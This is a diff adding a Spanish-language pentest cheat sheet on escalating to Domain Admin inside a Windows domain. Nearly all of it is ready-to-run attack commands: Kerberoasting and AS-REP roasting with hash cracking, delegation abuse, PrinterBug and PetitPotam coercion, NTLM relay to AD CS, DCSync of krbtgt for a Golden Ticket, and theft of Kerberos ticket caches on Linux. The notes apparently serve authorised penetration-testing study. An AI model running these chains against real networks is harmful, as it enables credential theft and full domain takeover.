@@ -1,0 +1,163 @@
+===========================================================
+  T2 - 8. COMPROMISO INTERNO (HASTA DOMAIN ADMIN)
+===========================================================
+Objetivo: demostrar impacto via compromiso de activos clave.
+Normalmente: obtener Domain Admin.
+
+===========================================================
+  KERBEROASTING
+===========================================================
+# Pide TGS de cuentas con SPN -> hash crackeable offline
+# Solo requiere usuario de dominio (sin privs).
+
+--- LINUX (Impacket) ---
+impacket-GetUserSPNs -request [DOMINIO]/[USER]:[PASS] -dc-ip [IP-DC]
+
+# Solo listar SPNs (sin pedir tickets)
+impacket-GetUserSPNs [DOMINIO]/[USER]:[PASS] -dc-ip [IP-DC]
+
+# Salida en formato hashcat
+impacket-GetUserSPNs -request [DOMINIO]/[USER]:[PASS] -dc-ip [IP-DC] -outputfile spns.txt
+
+--- WINDOWS (Rubeus) ---
+Rubeus.exe kerberoast
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Forzar downgrade a RC4 (mas facil de crackear)
+Rubeus.exe kerberoast /tgtdeleg
+
+--- IDENTIFICAR ENCRIPCION ---
+$23  -> RC4   (modo hashcat: 13100)
+$18  -> AES   (modo hashcat: 19700)
+
+--- CRACKEAR ---
+hashcat -m 13100 hashes.txt rockyou.txt
+hashcat -m 19700 hashes.txt rockyou.txt
+
+===========================================================
+  ASREPROASTING
+===========================================================
+# Para usuarios SIN preautenticacion Kerberos
+# Se pide AS-REP y se crackea offline
+
+--- LINUX (Impacket) ---
+impacket-GetNPUsers [DOMINIO]/ -usersfile users.txt -dc-ip [IP-DC] -no-pass
+impacket-GetNPUsers -request [DOMINIO]/[USER]:[PASS] -dc-ip [IP-DC]
+
+--- WINDOWS (Rubeus) ---
+Rubeus.exe asreproast
+Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+
+--- CRACKEAR ---
+hashcat -m 18200 hashes.txt rockyou.txt
+
+===========================================================
+  UNCONSTRAINED DELEGATION
+===========================================================
+# Si maquina tiene Unconstrained Del. -> al recibir conexiones
+# de cualquier usuario, su TGT queda cacheado en memoria.
+# Comprometer la maquina -> extraer TGTs de todos.
+
+--- IDENTIFICAR (BloodHound) ---
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+
+--- MONITOR EN MAQUINA CON UNCONSTRAINED ---
+Rubeus.exe monitor /targetuser:[USER] /interval:1
+Rubeus.exe monitor /interval:1
+
+--- CARGAR TICKET ---
+mimikatz # kerberos::ptt [TICKET.kirbi]
+
+===========================================================
+  CONSTRAINED DELEGATION
+===========================================================
+# Mas restringido. Permite a la maquina impersonar
+# a un usuario contra servicios concretos.
+
+--- IDENTIFICAR (BloodHound) ---
+MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
+
+--- ABUSAR (Rubeus s4u) ---
+Rubeus.exe s4u /user:[MAQ$] /rc4:[NT-HASH] /impersonateuser:[ADMIN] /msdsspn:cifs/[FQDN-OBJETIVO] /ptt
+
+===========================================================
+  PRINTERBUG (MS-RPRN)
+===========================================================
+# Si Print Spooler activo en DC -> forzar conexion
+# del DC al atacante -> capturar NetNTLMv2
+
+--- VERIFICAR ---
+impacket-rpcdump [IP-OBJETIVO] | grep -A 6 "spoolsv"
+
+--- EXPLOTAR ---
+python printerbug.py '[DOMINIO]/[USER]:[PASS]'@[IP-DC] [IP-ATACANTE]
+
+# Captura: responder o ntlmrelayx en escucha
+responder -I eth0
+impacket-ntlmrelayx -t ldap://[IP-DC2] --escalate-user [USER]
+
+===========================================================
+  COMBO: PRINTERBUG + UNCONSTRAINED = DOMAIN ADMIN
+===========================================================
+# Premisa: tenemos comprometida una maquina con Unconstrained Del.
+
+# 1) En la maquina Unconstrained: monitorizar tickets
+Rubeus.exe monitor /interval:1
+
+# 2) Forzar al DC a conectarse a la maquina Unconstrained
+SpoolSample.exe [FQDN-DC] [FQDN-MAQ-UNCONSTRAINED]
+# (alternativa Linux: dementor.py / printerbug.py)
+
+# 3) Cargar el TGT del DC capturado (base64)
+Rubeus.exe ptt /ticket:[BASE64]
+
+# 4) Volcar krbtgt via DCSync
+mimikatz # lsadump::dcsync /user:[DOMINIO]\krbtgt
+
+# Resultado: hash de krbtgt -> Golden Ticket disponible
+
+===========================================================
+  PETITPOTAM (MS-EFSR)
+===========================================================
+# Fuerza conexion desde cuenta SYSTEM de una maquina
+# Util para escalada local y relay a AD CS
+
+--- BASICO ---
+python petitpotam.py -d [FQDN] -u [USER] -p [PASS] [IP-ATACANTE] [IP-OBJETIVO]
+
+# Sin credenciales (anonimo, pre-parche)
+python petitpotam.py [IP-ATACANTE] [IP-OBJETIVO]
+
+# Repo: https://github.com/topotam/PetitPotam/
+
+===========================================================
+  RELAY A AD CS (ESC8) - DOMAIN ADMIN VIA PETITPOTAM
+===========================================================
+# 1) Identificar AD CS web enrollment
+certipy find -u [USER]@[FQDN] -p [PASS] -dc-ip [IP-DC]
+
+# 2) ntlmrelayx contra AD CS
+impacket-ntlmrelayx -t http://[IP-CS]/certsrv/certfnsh.asp --adcs --template DomainController
+
+# 3) Forzar autenticacion del DC
+python petitpotam.py [IP-ATACANTE] [IP-DC]
+
+# 4) Usar el certificado obtenido para PKINIT y obtener TGT
+certipy auth -pfx [DC.pfx] -dc-ip [IP-DC]
+
+===========================================================
+  LINUX CREDENTIAL CACHE (ccache)
+===========================================================
+# En maquinas Linux con Kerberos, los TGT se cachean en /tmp
+# Con root se pueden extraer
+
+ls -la /tmp/krb5cc_*
+cp /tmp/krb5cc_[UID] /tmp/ticket.ccache
+
+# Convertir a .kirbi para usar en Windows
+impacket-ticketConverter [TICKET.ccache] [TICKET.kirbi]
+
+# Usar directamente en Linux
+export KRB5CCNAME=/tmp/ticket.ccache
+klist
+impacket-psexec -k -no-pass [USER]@[FQDN-OBJETIVO]
